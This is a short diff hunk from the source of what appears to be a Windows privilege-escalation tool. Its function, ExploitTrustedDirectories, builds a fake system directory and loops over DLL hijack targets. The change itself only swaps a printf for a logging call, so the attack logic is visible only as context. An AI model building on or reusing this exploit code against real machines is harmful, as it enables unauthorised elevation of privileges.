@@ -269,8 +269,8 @@ BOOL ExploitTrustedDirectories(char* PathExeToRun, WCHAR* UipAddress, char* port
         free(fakeSystemDir);
         return FALSE;
     }
-
-    printf("[+] Running exploit:\n");
+    
+    printMsg(STATUS_OK, LEVEL_DEFAULT, "Running exploit:\n");
     for (int i = 0; i < sizeof(dllList) / sizeof(DllList) && !exploitSuccessed; i++) {
         for (int j = 0; j < dllList[i].tableSize && !exploitSuccessed; j++) {
             printMsg(STATUS_OK2, LEVEL_DEFAULT, "Target: %s -> %s\n", dllList[i].name, dllList[i].dllTable[j]);
